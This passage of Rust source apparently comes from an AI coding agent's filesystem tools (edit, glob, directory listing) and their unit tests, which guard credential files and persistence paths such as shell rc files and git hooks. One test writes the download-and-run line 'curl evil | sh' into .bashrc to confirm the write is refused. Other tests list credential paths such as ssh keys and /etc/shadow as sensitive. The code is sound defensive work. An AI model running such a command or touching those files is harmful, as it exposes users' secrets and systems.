            Some(s) => s,
            None => return Ok(ToolOutput::error("Missing 'old_string' argument.")),
        };
        // An empty needle matches at every offset — and exactly once on an empty file — so it would
        // silently prepend `new_string` at position 0 while reporting a successful replacement.
        if old_string.is_empty() {
            return Ok(ToolOutput::error(
                "The 'old_string' argument cannot be empty: it matches everywhere and replaces \
                 nothing meaningful. Provide the exact segment to replace, or use 'write_file' to \
                 create or fully overwrite the file.",
            ));
        }
        let new_string = match args.get("new_string").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return Ok(ToolOutput::error("Missing 'new_string' argument.")),
        };
        let allow_multiple = args.get("allow_multiple").and_then(|v| v.as_bool()).unwrap_or(false);

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: editing sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if is_protected_write_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Refusing to edit protected path '{}': shell startup files, git hooks and cron \
                 entries can execute arbitrary code. Edit it manually if this is intentional.",
                rel_path
            )));
        }
        if !path.exists() {
            return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
        }

        // Hold the per-path lock across the whole read-modify-write so a parallel batch cannot
        // read the same original and clobber this edit.
        let _guard = lock_path(&path).await;

        if let Err(msg) = check_observed(&path, rel_path) {
            return Ok(ToolOutput::error(msg));
        }

        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(e) => return Ok(ToolOutput::error(format!("Failed to read {}: {}", rel_path, e))),
        };

        let uniform_crlf = content.contains("\r\n")
            && content.matches('\n').count() == content.matches("\r\n").count();

        // 1. Fast exact matching
        let count = content.matches(old_string).count();
        let mut tolerant_match = false;
        let (modified, start_line, end_line) = if count == 1 {
            let offset = content.find(old_string).unwrap();
            let start_line = content[..offset].chars().filter(|&c| c == '\n').count() + 1;
            let replaced_lines = new_string.lines().count().max(1);
            let end_line = start_line + replaced_lines - 1;
            let res = content.replacen(old_string, new_string, 1);
            (res, start_line, end_line)
        } else if count > 1 {
            if !allow_multiple {
                return Ok(ToolOutput::error(format!(
                    "old_string occurs {} times in {}. Specify allow_multiple: true or provide more surrounding context lines.",
                    count, rel_path
                )));
            }
            let first_offset = content.find(old_string).unwrap_or(0);
            let start_line = content[..first_offset].chars().filter(|&c| c == '\n').count() + 1;
            let res = content.replace(old_string, new_string);
            let end_line = res.lines().count().max(start_line);
            (res, start_line, end_line)
        } else {
            // 2. CRLF/LF newline normalization match
            let content_norm = content.replace("\r\n", "\n");
            let old_norm = old_string.replace("\r\n", "\n");
            let new_norm = new_string.replace("\r\n", "\n");
            let norm_count = content_norm.matches(&old_norm).count();

            if norm_count == 1 {
                let offset = content_norm.find(&old_norm).unwrap();
                let start_line = content_norm[..offset].chars().filter(|&c| c == '\n').count() + 1;
                let replaced_lines = new_norm.lines().count().max(1);
                let end_line = start_line + replaced_lines - 1;
                let mut res = content_norm.replacen(&old_norm, &new_norm, 1);
                if uniform_crlf {
                    res = res.replace('\n', "\r\n");
                }
                (res, start_line, end_line)
            } else if norm_count > 1 && !allow_multiple {
                return Ok(ToolOutput::error(format!(
                    "old_string occurs {} times in {} (with normalized line endings). Specify allow_multiple: true or provide more surrounding context lines.",
                    norm_count, rel_path
                )));
            } else if norm_count > 1 && allow_multiple {
                let first_offset = content_norm.find(&old_norm).unwrap_or(0);
                let start_line = content_norm[..first_offset].chars().filter(|&c| c == '\n').count() + 1;
                let mut res = content_norm.replace(&old_norm, &new_norm);
                let end_line = res.lines().count().max(start_line);
                if uniform_crlf {
                    res = res.replace('\n', "\r\n");
                }
                (res, start_line, end_line)
            } else {
                // 3. Flexible line-by-line trimmed matching fallback
                let content_lines: Vec<&str> = content.lines().collect();
                let old_lines: Vec<&str> = old_string.lines().collect();
                let old_trimmed: Vec<&str> = old_lines.iter().map(|l| l.trim()).collect();

                let mut matching_indices = Vec::new();
                if !old_trimmed.is_empty() && content_lines.len() >= old_trimmed.len() {
                    for i in 0..=content_lines.len() - old_trimmed.len() {
                        let matches_all = (0..old_trimmed.len())
                            .all(|j| content_lines[i + j].trim() == old_trimmed[j]);
                        if matches_all {
                            matching_indices.push(i);
                        }
                    }
                }

                if matching_indices.len() == 1 || (matching_indices.len() > 1 && allow_multiple) {
                    let mut current_lines: Vec<String> = content_lines.iter().map(|s| s.to_string()).collect();
                    let raw_replacement: Vec<&str> = new_string.lines().collect();
                    let old_base_indent = old_lines
                        .iter()
                        .find(|l| !l.trim().is_empty())
                        .map(|l| l.len() - l.trim_start().len())
                        .unwrap_or(0);
                    // Apply in reverse order so earlier indices remain valid
                    for &start_idx in matching_indices.iter().rev() {
                        let end_idx = start_idx + old_trimmed.len();
                        if end_idx <= current_lines.len() {
                            let file_base_prefix: String = current_lines[start_idx..end_idx]
                                .iter()
                                .find(|l| !l.trim().is_empty())
                                .map(|l| l.chars().take_while(|c| c.is_whitespace()).collect())
                                .unwrap_or_default();
                            let adjusted_replacement: Vec<String> = raw_replacement
                                .iter()
                                .map(|line| {
                                    if line.trim().is_empty() {
                                        String::new()
                                    } else if old_base_indent == 0 && !file_base_prefix.is_empty() && !line.starts_with(&file_base_prefix) {
                                        format!("{}{}", file_base_prefix, line)
                                    } else {
                                        (*line).to_string()
                                    }
                                })
                                .collect();
                            current_lines.splice(start_idx..end_idx, adjusted_replacement);
                        }
                    }
                    let line_ending = if uniform_crlf { "\r\n" } else { "\n" };
                    let mut res = current_lines.join(line_ending);
                    if content.ends_with('\n') || content.ends_with("\r\n") {
                        res.push_str(line_ending);
                    }
                    tolerant_match = true;
                    let start_line = matching_indices[0] + 1;
                    let replaced_lines = raw_replacement.len().max(1);
                    let end_line = start_line + replaced_lines - 1;
                    (res, start_line, end_line)
                } else if matching_indices.len() > 1 && !allow_multiple {
                    return Ok(ToolOutput::error(format!(
                        "old_string matches {} different locations with trimmed whitespace. Provide more surrounding context lines.",
                        matching_indices.len()
                    )));
                } else {
                    // Intelligent diagnostic hint
                    let first_non_empty = old_lines.iter().find(|l| !l.trim().is_empty()).map(|l| l.trim());
                    let hint = if let Some(target) = first_non_empty {
                        let candidates: Vec<usize> = content_lines
                            .iter()
                            .enumerate()
                            .filter(|(_, l)| l.trim() == target)
                            .map(|(i, _)| i + 1)
                            .take(3)
                            .collect();
                        if !candidates.is_empty() {
                            format!(
                                " Hint: Line(s) {:?} match the start of old_string, but surrounding lines or indentation differed.",
                                candidates
                            )
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    };

                    return Ok(ToolOutput::error(format!(
                        "Target old_string was not found in {}. Ensure exact whitespace and context match.{}",
                        rel_path, hint
                    )));
                }
            }
        };

        // Compare-and-swap: refuse to clobber a file that changed under us (an external editor or
        // another process may have written it between our read and this write).
        if let Ok(current) = fs::read_to_string(&path) {
            if current != content {
                return Ok(ToolOutput::error(format!(
                    "Refusing to edit {}: the file changed on disk after it was read. Re-read it and retry.",
                    rel_path
                )));
            }
        }

        if let Err(e) = atomic_write(&path, &modified) {
            return Ok(ToolOutput::error(format!("Failed to write edited content to {}: {}", rel_path, e)));
        }
        observe_file(&path);

        let preview = format_edit_preview(&content, &modified);
        let lines_str = if start_line == end_line {
            format!("line {}", start_line)
        } else {
            format!("lines {}-{}", start_line, end_line)
        };
        let tolerance_note = if tolerant_match {
            " old_string only matched ignoring leading/trailing whitespace; check the indentation in the preview."
        } else {
            ""
        };
        let output_msg = if !preview.is_empty() {
            format!(
                "Successfully edited {} ({}):{}\n{}",
                rel_path, lines_str, tolerance_note, preview
            )
        } else {
            format!("Successfully edited {}.{}", rel_path, tolerance_note)
        };

        Ok(ToolOutput::success_with_summary(
            output_msg,
            format!("Edited {}", rel_path),
        ))
    }
}

// ─── 4. GlobTool ────────────────────────────────────────────────────────────

pub struct GlobTool;

#[async_trait]
impl Tool for GlobTool {
    fn name(&self) -> &'static str {
        "glob"
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        read_path_needs_confirmation(
            self.name(),
            args.get("dir_path").and_then(|v| v.as_str()),
            context,
        )
    }

    fn description(&self) -> &'static str {
        "Efficiently finds files matching glob patterns (e.g. `src/**/*.rs`, `**/*.md`, `*.json`), skipping .git and respecting .gitignore. [PREFERRED instead of shell find]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "pattern": {
                    "type": "string",
                    "description": "Glob pattern (e.g. '**/*.rs', 'src/**/*.ts', '*.toml')."
                },
                "dir_path": {
                    "type": "string",
                    "description": "Optional root directory to search in (defaults to workspace root)."
                }
            },
            "required": ["pattern"]
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let pattern_str = match args.get("pattern").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'pattern' argument.")),
        };

        let root_dir = args
            .get("dir_path")
            .and_then(|v| v.as_str())
            .map(|p| resolve_path(&context.workspace_dir, p))
            .unwrap_or_else(|| context.workspace_dir.clone());

        let glob_pattern = match glob::Pattern::new(pattern_str) {
            Ok(g) => g,
            Err(e) => return Ok(ToolOutput::error(format!("Invalid glob pattern '{}': {}", pattern_str, e))),
        };

        let mut matches: Vec<(String, Option<std::time::SystemTime>)> = Vec::new();
        let walker = WalkBuilder::new(&root_dir)
            .hidden(false)
            .git_ignore(true)
            .filter_entry(|entry| {
                let name = entry.file_name().to_string_lossy();
                name != ".git"
            })
            .build();

        for entry in walker.flatten() {
            let path = entry.path();
            if path == root_dir || !path.is_file() {
                continue;
            }
            let rel_to_root = path.strip_prefix(&root_dir).unwrap_or(path);
            let rel_root_str = rel_to_root.to_string_lossy();
            let display_rel = path
                .strip_prefix(&context.workspace_dir)
                .unwrap_or(path)
                .to_string_lossy();
            let file_name = path.file_name().map(|n| n.to_string_lossy()).unwrap_or_default();
            if glob_pattern.matches(&rel_root_str)
                || glob_pattern.matches(&display_rel)
                || glob_pattern.matches(path.to_str().unwrap_or(""))
                || glob_pattern.matches(&file_name)
            {
                let mtime = entry.metadata().ok().and_then(|m| m.modified().ok());
                matches.push((display_rel.to_string(), mtime));
                if matches.len() >= GLOB_COLLECT_LIMIT {
                    break;
                }
            }
        }

        // Most recently modified first: that is the part of a big result worth seeing.
        matches.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
        if matches.is_empty() {
            return Ok(ToolOutput::success("No matching files found."));
        }

        let total = matches.len();
        let shown: Vec<&str> = matches.iter().take(GLOB_SHOW_LIMIT).map(|(p, _)| p.as_str()).collect();
        if total <= GLOB_SHOW_LIMIT {
            return Ok(ToolOutput::success(format!(
                "Found {} matching file(s), newest first:\n{}",
                total,
                shown.join("\n")
            )));
        }

        let full_list: String = matches.iter().map(|(p, _)| format!("{}\n", p)).collect();
        let saved = save_full_listing(&full_list);
        let capped = if total >= GLOB_COLLECT_LIMIT { "+" } else { "" };
        let tail = match saved {
            Some(path) => format!(
                "... {} more not shown. The complete list is saved at {} (read it with read_file or grep it), or narrow the pattern.",
                total - GLOB_SHOW_LIMIT,
                path.display()
            ),
            None => format!(
                "... {} more not shown. Narrow the pattern to see them.",
                total - GLOB_SHOW_LIMIT
            ),
        };
        Ok(ToolOutput::success(format!(
            "Found {}{} matching files; showing the {} newest:\n{}\n{}",
            total,
            capped,
            GLOB_SHOW_LIMIT,
            shown.join("\n"),
            tail
        )))
    }
}

/// Matches `glob` shows to the model per call.
const GLOB_SHOW_LIMIT: usize = 100;
/// Matches `glob` collects before it stops walking the tree.
const GLOB_COLLECT_LIMIT: usize = 20_000;

/// Saves a listing too long for the context to a private spill file and returns where it is.
fn save_full_listing(content: &str) -> Option<PathBuf> {
    corex_core::spill::spill_text("glob", content)
}

// ─── 5. LsTool ──────────────────────────────────────────────────────────────

pub struct LsTool;

#[async_trait]
impl Tool for LsTool {
    fn name(&self) -> &'static str {
        "list_directory"
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        read_path_needs_confirmation(
            self.name(),
            args.get("dir_path").and_then(|v| v.as_str()),
            context,
        )
    }

    fn description(&self) -> &'static str {
        "Lists names and sizes of files and subdirectories directly within a specified directory path. [PREFERRED instead of shell ls]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "dir_path": {
                    "type": "string",
                    "description": "The path to the directory to list (defaults to current working directory)."
                }
            }
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = args.get("dir_path").and_then(|v| v.as_str()).unwrap_or(".");
        let path = resolve_path(&context.workspace_dir, rel_path);

        if !path.exists() {
            return Ok(ToolOutput::error(format!("Directory does not exist: {}", rel_path)));
        }

        if !path.is_dir() {
            return Ok(ToolOutput::error(format!("Path '{}' is a file, not a directory. Use 'read_file' instead.", rel_path)));
        }

        let mut entries = Vec::new();
        match fs::read_dir(&path) {
            Ok(read_dir) => {
                for item in read_dir.flatten() {
                    let file_name = item.file_name().to_string_lossy().to_string();
                    if file_name == ".git" {
                        continue;
                    }
                    let metadata = item.metadata();
                    let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                    let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);

                    entries.push((is_dir, file_name, size));
                }
            }
            Err(e) => return Ok(ToolOutput::error(format!("Failed to list {}: {}", rel_path, e))),
        }

        // Sort entries: directories first, then alphabetically
        entries.sort_by(|a, b| {
            if a.0 && !b.0 {
                std::cmp::Ordering::Less
            } else if !a.0 && b.0 {
                std::cmp::Ordering::Greater
            } else {
                a.1.to_lowercase().cmp(&b.1.to_lowercase())
            }
        });

        let total_count = entries.len();
        if entries.len() > 150 {
            entries.truncate(150);
        }

        let mut formatted_entries = Vec::new();
        for (is_dir, name, size) in entries {
            if is_dir {
                formatted_entries.push(format!("[DIR]  {}", name));
            } else {
                formatted_entries.push(format!("{:>10}  {}", format_size(size), name));
            }
        }

        let cap_notice = if total_count > 150 {
            format!("\n... [Showing 150 of {} items]", total_count)
        } else {
            String::new()
        };

        let result = format!(
            "Directory listing for {}:\n{}{}",
            path.display(),
            if formatted_entries.is_empty() {
                "(Directory is empty)".to_string()
            } else {
                formatted_entries.join("\n")
            },
            cap_notice
        );

        Ok(ToolOutput::success(result))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sensitive_and_protected_paths_are_classified() {
        // Credential/auth paths must be flagged as sensitive.
        assert!(is_sensitive_system_path(Path::new("/home/x/.ssh/id_rsa")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.gnupg/secring.gpg")));
        assert!(is_sensitive_system_path(Path::new("/etc/shadow")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.aws/credentials")));
        assert!(is_sensitive_system_path(Path::new("/proc/self/environ")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.corex/.askpass_cred")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.corex/settings.json")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.deepseek/settings.json")));
        assert!(is_sensitive_system_path(Path::new("/home/x/project/.env")));
        assert!(is_sensitive_system_path(Path::new("/home/x/project/.env.local")));
        assert!(is_sensitive_system_path(Path::new("/home/x/project/.env.production")));
        // Template/example env files and ordinary files are not sensitive.
        assert!(!is_sensitive_system_path(Path::new("/home/x/project/.env.example")));
        assert!(!is_sensitive_system_path(Path::new("/home/x/project/.env.sample")));
        assert!(!is_sensitive_system_path(Path::new("/home/x/project/.env.template")));
        assert!(!is_sensitive_system_path(Path::new("/home/x/project/src/main.rs")));
        assert!(!is_sensitive_system_path(Path::new("/etc/hosts")));

        // Persistence vectors are refused outright.
        assert!(is_protected_write_path(Path::new("/home/x/.bashrc")));
        assert!(is_protected_write_path(Path::new("/home/x/.git/hooks/pre-commit")));
        assert!(is_protected_write_path(Path::new("/home/x/.ssh/authorized_keys")));
        assert!(is_protected_write_path(Path::new("/home/x/.corex/settings.json")));
        assert!(is_protected_write_path(Path::new("/home/x/.corex/mcp.json")));
        assert!(is_protected_write_path(Path::new(".corex/settings.json")));
        assert!(is_protected_write_path(Path::new("/home/x/.deepseek/settings.json")));
        assert!(is_protected_write_path(Path::new("/home/x/project/.git/config")));
        assert!(is_protected_write_path(Path::new(".git/config")));
        assert!(is_protected_write_path(Path::new("/home/x/project/.git/info/attributes")));
        assert!(!is_protected_write_path(Path::new("/home/x/project/build.rs")));
        assert!(!is_protected_write_path(Path::new("/home/x/project/config")));
    }

    #[test]
    fn reads_outside_workspace_need_confirmation() {
        let ws = std::env::temp_dir().join(format!("corex-readpolicy-{}", std::process::id()));
        fs::create_dir_all(ws.join("src")).unwrap();
        let mut ctx = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: false,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };
        assert!(!read_path_needs_confirmation("read_file", Some("src/main.rs"), &ctx));
        assert!(!read_path_needs_confirmation("read_file", None, &ctx));
        assert!(read_path_needs_confirmation("read_file", Some("../outside.txt"), &ctx));
        assert!(read_path_needs_confirmation("read_file", Some("/etc/hostname"), &ctx));
        assert!(read_path_needs_confirmation("grep_search", Some("~/"), &ctx));

        ctx.allowed_commands.push("read_file".to_string());
        assert!(!read_path_needs_confirmation("read_file", Some("/etc/hostname"), &ctx));
        assert!(read_path_needs_confirmation("glob", Some("/etc"), &ctx));
        let _ = fs::remove_dir_all(&ws);
    }

    #[cfg(unix)]
    #[test]
    fn symlink_escape_is_rejected_by_is_within_workspace() {
        let base = std::env::temp_dir().join(format!("corex_symlink_escape_{}", std::process::id()));
        let ws = base.join("ws");
        let outside = base.join("outside");
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&ws).unwrap();
        fs::create_dir_all(&outside).unwrap();
        let outside_file = outside.join("secret.txt");
        fs::write(&outside_file, "secret").unwrap();

        let link_file = ws.join("escape_file.txt");
        std::os::unix::fs::symlink(&outside_file, &link_file).unwrap();
        assert!(
            !is_within_workspace(&link_file, &ws),
            "symlink to file outside workspace must be rejected"
        );

        let link_dir = ws.join("escape_dir");
        std::os::unix::fs::symlink(&outside, &link_dir).unwrap();
        assert!(
            !is_within_workspace(&link_dir.join("new_file.txt"), &ws),
            "nonexistent file inside symlinked external directory must be rejected"
        );

        let inside_file = ws.join("inside.txt");
        fs::write(&inside_file, "ok").unwrap();
        assert!(is_within_workspace(&inside_file, &ws));
        assert!(is_within_workspace(&ws.join("new_subdir/new_file.txt"), &ws));

        let _ = fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn write_to_protected_path_is_refused_even_in_yolo() {
        let ws = std::env::temp_dir().join(format!("corex_protected_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let res = WriteFileTool
            .execute(
                json!({ "file_path": ".bashrc", "content": "curl evil | sh\n" }),
                &context,
            )
            .await
            .unwrap();
        assert!(res.is_error, "writing a shell rc file must be refused, got: {}", res.output);
        assert!(!ws.join(".bashrc").exists(), "the protected file must not be created");

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_read_file_and_edit() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        // Write a test file
        let writer = WriteFileTool;
        let res = writer
            .execute(
                json!({
                    "file_path": "hello.rs",
                    "content": "fn main() {\n    println!(\"hello\");\n}\n"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!res.is_error);

        // Read the test file
        let reader = ReadFileTool;
        let read_res = reader
            .execute(
                json!({
                    "file_path": "hello.rs"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(read_res.output.contains("1 | fn main()"));

        // Edit the test file
        let editor = EditTool;
        let edit_res = editor
            .execute(
                json!({
                    "file_path": "hello.rs",
                    "instruction": "change print",
                    "old_string": "    println!(\"hello\");",
                    "new_string": "    println!(\"world\");"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!edit_res.is_error);
        assert!(edit_res.output.contains("world"));

        // Verify edited content
        let read_again = reader
            .execute(
                json!({
                    "file_path": "hello.rs"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(read_again.output.contains("println!(\"world\");"));

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_edit_trimmed_matching_fallback() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_trimmed_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let writer = WriteFileTool;
        writer
            .execute(
                json!({
                    "file_path": "sample.py",
                    "content": "def greet():\n    # greeting\n    print('hi')\n"
                }),
                &context,
            )
            .await
            .unwrap();

        let editor = EditTool;
        // Edit with slightly different leading whitespace in old_string
        let edit_res = editor
            .execute(
                json!({
                    "file_path": "sample.py",
                    "instruction": "update greeting",
                    "old_string": "  # greeting\n  print('hi')",
                    "new_string": "    print('hello there')"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!edit_res.is_error);

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_edit_line_number_calculation() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_line_calc_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let content = "line 1\nline 2\nline 3\nline 4\nline 5\nline 6\nline 7\nline 8\nline 9\nline 10\n";
        let writer = WriteFileTool;
        writer
            .execute(
                json!({
                    "file_path": "test.txt",
                    "content": content
                }),
                &context,
            )
            .await
            .unwrap();

        let editor = EditTool;
        let res = editor
            .execute(
                json!({
                    "file_path": "test.txt",
                    "old_string": "line 8\n",
                    "new_string": "line 8 modified\n"
                }),
                &context,
            )
            .await
            .unwrap();

        assert!(!res.is_error);
        assert!(res.output.contains("(line 8):"), "Output should contain '(line 8):', got: {}", res.output);
        assert!(res.output.contains("+   8 | line 8 modified"), "Output should show line 8 as added, got: {}", res.output);
        assert!(res.output.contains("-   8 | line 8\n"), "Output should keep the line the edit replaced, got: {}", res.output);

        let diff = editor.format_diff(
            &json!({
                "file_path": "test.txt",
                "old_string": "line 8 modified\n",
                "new_string": "line 8 diff\n"
            }),
            &ws,
        ).unwrap();
        assert!(diff.contains("@@"), "Diff should contain hunk header @@, got: {}", diff);
        assert!(diff.contains("-line 8 modified"));
        assert!(diff.contains("+line 8 diff"));

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_read_file_inverted_range_and_empty_safe() {
        let ws = std::env::temp_dir().join(format!("corex_rf_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let test_file = ws.join("sample.txt");
        fs::write(&test_file, "line 1\nline 2\nline 3\nline 4\nline 5\n").unwrap();

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let reader = ReadFileTool;

        // Inverted range must return an error and NOT panic
        let res = reader.execute(
            json!({
                "file_path": "sample.txt",
                "start_line": 5,
                "end_line": 2
            }),
            &context,
        ).await.unwrap();
        assert!(res.is_error);
        assert!(res.output.contains("Invalid line range"));

        // Empty file must not panic with start_line > 1
        let empty_file = ws.join("empty.txt");
        fs::write(&empty_file, "").unwrap();
        let res_empty = reader.execute(
            json!({
                "file_path": "empty.txt",
                "start_line": 2
            }),
            &context,
        ).await.unwrap();
        assert!(!res_empty.is_error);
        assert_eq!(res_empty.output, "(Empty file)");

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn test_edit_preview_keeps_the_lines_the_edit_removed() {
        let preview = format_edit_preview("a\nb\nc\nd\ne\n", "a\nB\nc\nd\ne\n");

        assert!(preview.contains("-   2 | b\n"), "the replaced line must be shown, got: {}", preview);
        assert!(preview.contains("+   2 | B\n"), "the new line must be shown, got: {}", preview);
        assert!(preview.contains("    1 | a\n"), "surrounding context keeps its own numbering, got: {}", preview);
    }

    #[test]
    fn test_edit_preview_elides_the_untouched_middle_of_a_long_file() {
        let old: String = (1..=40).map(|i| format!("line {}\n", i)).collect();
        let new = old.replace("line 2\n", "line 2 changed\n").replace("line 38\n", "line 38 changed\n");

        let preview = format_edit_preview(&old, &new);

        assert!(preview.contains("-   2 | line 2\n"), "got: {}", preview);
        assert!(preview.contains("+  38 | line 38 changed\n"), "both far-apart changes must survive, got: {}", preview);
        assert!(preview.contains("lines not shown"), "the untouched middle must be elided, got: {}", preview);
        assert!(!preview.contains("line 20\n"), "elided lines cannot reach the preview, got: {}", preview);
    }

    /// Eight edits to the same file launched concurrently: every single one must land.
    ///
    /// Before the per-path lock this was a lost update — each task read the same original, the last
    /// `rename` won, and the other seven edits vanished while every call still returned success.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn concurrent_edits_to_the_same_file_all_land() {
        let ws = std::env::temp_dir().join(format!("corex_concurrent_edit_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();

        let original: String = (1..=8).map(|i| format!("line {}\n", i)).collect();
        fs::write(ws.join("sample.txt"), &original).unwrap();
        observe_file(&ws.join("sample.txt"));

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let mut handles = Vec::new();
        for i in 1..=8 {
            let ctx = context.clone();
            handles.push(tokio::spawn(async move {
                EditTool
                    .execute(
                        json!({
                            "file_path": "sample.txt",
                            "old_string": format!("line {}\n", i),
                            "new_string": format!("LINE {}\n", i),
                        }),
                        &ctx,
                    )
                    .await
                    .unwrap()
            }));
        }

        for handle in handles {
            let res = handle.await.unwrap();
            assert!(!res.is_error, "every edit must succeed, got: {}", res.output);
        }

        let final_content = fs::read_to_string(ws.join("sample.txt")).unwrap();
        let expected: String = (1..=8).map(|i| format!("LINE {}\n", i)).collect();
        assert_eq!(final_content, expected, "every concurrent edit must survive");

        let _ = fs::remove_dir_all(&ws);
    }

    /// An empty needle matches at every offset, so accepting it would report a successful
    /// replacement while silently inserting at position 0. It must be rejected and change nothing.
    #[tokio::test]
    async fn edit_rejects_an_empty_old_string() {
        let ws = std::env::temp_dir().join(format!("corex_empty_old_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        fs::write(ws.join("sample.txt"), "keep me\n").unwrap();

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let res = EditTool
            .execute(
                json!({ "file_path": "sample.txt", "old_string": "", "new_string": "injected\n" }),
                &context,
            )
            .await
            .unwrap();

        assert!(res.is_error, "an empty old_string must be rejected, got: {}", res.output);
        assert_eq!(
            fs::read_to_string(ws.join("sample.txt")).unwrap(),
            "keep me\n",
            "the file must be left untouched"
        );

        let _ = fs::remove_dir_all(&ws);
    }

    /// The lock must really exclude: a second holder cannot proceed while the first holds it.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn lock_path_serializes_concurrent_holders() {
        use std::sync::atomic::{AtomicBool, Ordering};

        let ws = std::env::temp_dir().join(format!("corex_lock_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let target = ws.join("target.txt");
        fs::write(&target, "x").unwrap();

        let guard = lock_path(&target).await;

        let acquired = std::sync::Arc::new(AtomicBool::new(false));
        let flag = acquired.clone();
        let path = target.clone();
        let waiter = tokio::spawn(async move {
            let _guard = lock_path(&path).await;
            flag.store(true, Ordering::SeqCst);
        });

        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        assert!(
            !acquired.load(Ordering::SeqCst),
            "a second lock_path must block while the first guard is alive"
        );

        drop(guard);
        waiter.await.unwrap();
        assert!(acquired.load(Ordering::SeqCst));

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn test_fs_tools_needs_confirmation_respects_session_allowed_commands() {
        let temp_dir = std::env::temp_dir().join(format!("fs_confirm_{}", std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);
        let file = temp_dir.join("test.txt");
        let _ = fs::write(&file, "hello world\n");

        let mut context = ToolContext {
            workspace_dir: temp_dir.clone(),
            yolo_mode: false,
            sudo_password: None,
            allowed_commands: vec!["apply_patch".to_string()],
        };

        // When "apply_patch" is allowed, edit & write_file must NOT require confirmation
        assert!(!EditTool.needs_confirmation(&json!({ "file_path": "test.txt", "old_string": "hello", "new_string": "hi" }), &context));
        assert!(!WriteFileTool.needs_confirmation(&json!({ "file_path": "test.txt", "content": "hi" }), &context));

        // When allowed_commands is empty, both must require confirmation
        context.allowed_commands.clear();
        assert!(EditTool.needs_confirmation(&json!({ "file_path": "test.txt", "old_string": "hello", "new_string": "hi" }), &context));
        assert!(WriteFileTool.needs_confirmation(&json!({ "file_path": "test.txt", "content": "hi" }), &context));

        let _ = fs::remove_dir_all(&temp_dir);
    }

    fn observed_ctx(tag: &str) -> (PathBuf, ToolContext) {
        let ws = std::env::temp_dir().join(format!("corex_observed_{}_{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        let ctx = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };
        (ws, ctx)
    }

